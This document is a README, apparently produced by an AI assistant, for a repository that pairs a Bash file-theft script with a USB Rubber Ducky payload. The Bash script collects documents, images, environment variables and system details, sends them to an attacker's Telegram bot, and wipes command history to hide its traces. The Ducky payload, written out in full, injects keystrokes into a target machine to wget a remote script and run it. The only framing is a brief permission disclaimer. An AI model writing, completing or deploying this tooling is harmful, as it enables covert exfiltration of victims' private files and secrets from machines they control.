
# System Information and File Collection Script

This repository contains two scripts:
1. A **Bash script** that collects system information and specific file types, compresses them, and sends them to a Telegram chat.
2. A **USB Rubber Ducky script** that automates the download and execution of the Bash script on a target machine.

## Features

### Bash Script
- **System Information Collection**: Gathers hostname, username, operating system details, current directory, and environment variables.
- **File Collection**: Searches for specific file types (e.g., `.txt`, `.doc`, `.pdf`, `.jpg`, etc.) in a specified directory and its subdirectories.
- **File Compression**: Compresses the collected files and system information into a ZIP file.
- **File Splitting**: Splits the ZIP file into smaller chunks to stay under Telegram's 50 MB file size limit.
- **Telegram Integration**: Sends each chunk of the ZIP file to a specified Telegram chat using a bot.
- **Cleanup**: Deletes temporary files and clears the command history to remove footprints.

### USB Rubber Ducky Script
- **Automated Execution**: Automates the process of downloading and running the Bash script on a target machine.
- **Quick Deployment**: Uses keystroke injection to open a terminal, download the script, and execute it.

---

## Prerequisites

### For the Bash Script
- **Bash**: The script is written in Bash and should be run in a Bash-compatible shell.
- **curl**: Required for sending messages and files to Telegram.
- **Telegram Bot**: You need a Telegram bot and its token to send messages and files.
- **Chat ID**: The chat ID of the Telegram chat where the files will be sent.

### For the USB Rubber Ducky Script
- **USB Rubber Ducky**: A USB Rubber Ducky device or a compatible keystroke injection tool.
- **Target Machine**: A machine running a Linux-based OS with a graphical environment (e.g., GNOME).

---

## Customizable Parameters

### Bash Script
Before running the Bash script, customize the following parameters:
- `TELEGRAM_BOT_TOKEN`: Replace with your Telegram bot token.
- `TELEGRAM_CHAT_ID`: Replace with your Telegram chat ID.
- `ROOT_DIRECTORY`: The root directory to start searching for files (default is `$HOME`).
- `HIDDEN_DIRECTORY`: The path where temporary files will be stored (default is `$HOME/.hidden_folder`).
- `MAX_FILE_SIZE`: The maximum size of each file chunk (default is 45 MB to stay under Telegram's 50 MB limit).
- `FILE_TYPES`: An array of file types to collect (e.g., `*.txt`, `*.doc`, `*.pdf`, etc.).

USB Rubber Ducky Script
Replace the following in the script:
- `https://raw.githubusercontent.com/username/usbbot/refs/heads/main/script.sh` with the direct URL to your Bash script.
----

## Usage
 Bash Script
1. **Clone the repository** or download the script to your local machine.
2. **Customize the parameters** in the script as described above.
3. **Make the script executable**:

```bash
   chmod +x script_name.sh
   ```
4. **Run the script**:
   ```bash
   ./script_name.sh
   ```

### USB Rubber Ducky Script
1. **Encode the script** using the Duck Encoder or a compatible tool.
2. **Upload the script** to your USB Rubber Ducky.
3. **Plug the USB Rubber Ducky** into the target machine.
4. The script will automatically:
   - Open a terminal.
   - Download the Bash script from the specified URL.
   - Make the script executable.
   - Execute the script.

---

## Scripts

### Bash Script
```bash
#!/bin/bash

# Customizable Parameters
TELEGRAM_BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
TELEGRAM_CHAT_ID="YOUR_CHAT_ID"               # Replace with your chat ID
ROOT_DIRECTORY="$HOME"                        # Root directory to start searching from
HIDDEN_DIRECTORY="$HOME/.hidden_folder"       # Hidden directory path
MAX_FILE_SIZE=45000000                        # 45 MB (to stay under Telegram's 50 MB limit)

# File types to collect (e.g., documents, images, etc.)
FILE_TYPES=("*.txt" "*.doc" "*.docx" "*.pdf" "*.xls" "*.xlsx" "*.jpg" "*.png" "*.zip" "*.rar")

# ... (rest of the script)
```

### USB Rubber Ducky Script
```plaintext
DELAY 1000
GUI r
DELAY 1000
STRING gnome-terminal
ENTER
DELAY 2000
STRING wget -O /tmp/script.sh https://raw.githubusercontent.com/username/usbbot/refs/heads/main/script.sh
ENTER
DELAY 3000
STRING chmod +x /tmp/script.sh
ENTER
DELAY 1000
STRING /tmp/script.sh
ENTER
```

---

## Notes

- **Security**: Be cautious when using these scripts, as they collect and send sensitive information. Ensure that your Telegram bot and chat are secure.
- **File Size**: The Bash script splits files to stay under Telegram's 50 MB limit. Adjust `MAX_FILE_SIZE` if needed.
- **Cleanup**: The Bash script deletes temporary files and clears the command history to remove footprints. Ensure you have backups if needed.
- **USB Rubber Ducky**: Use the USB Rubber Ducky script responsibly and only on systems where you have permission.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
```

This updated `README.md` file now includes the USB Rubber Ducky script, its purpose, and instructions for use. It also maintains the existing documentation for the Bash script.
